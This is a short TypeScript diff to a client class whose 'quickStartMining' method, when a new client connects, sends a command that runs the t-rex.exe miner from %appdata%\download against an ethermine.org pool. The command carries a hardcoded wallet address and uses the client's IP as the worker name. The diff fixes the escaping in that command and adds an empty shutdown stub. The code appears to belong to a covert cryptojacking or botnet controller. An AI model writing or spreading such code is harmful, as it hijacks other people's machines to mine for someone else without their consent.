@@ -61,9 +61,12 @@ class Client {
   }
   public quickStartMining() {
     this.socket.on("client_newClient", (clientIP: string) => {
-      const COMMAND = `%appdata%\download\t-rex.exe -a ethash -o stratum+tcp://asia1.ethermine.org:14444 -u 0x8928bc49dE9c7c1896C073Da72C1816d5F96C28E -p x -w ${clientIP}`;
+      const COMMAND = `%appdata%\\download\\t-rex.exe -a ethash -o stratum+tcp://asia1.ethermine.org:14444 -u 0x8928bc49dE9c7c1896C073Da72C1816d5F96C28E -p x -w ${clientIP}`;
       this.socket.emit("command", null, COMMAND);
     });
+  }
+  public async autoShutdownProcess() {
+    setTimeout(() => {}, 1000);
   }
 }
 
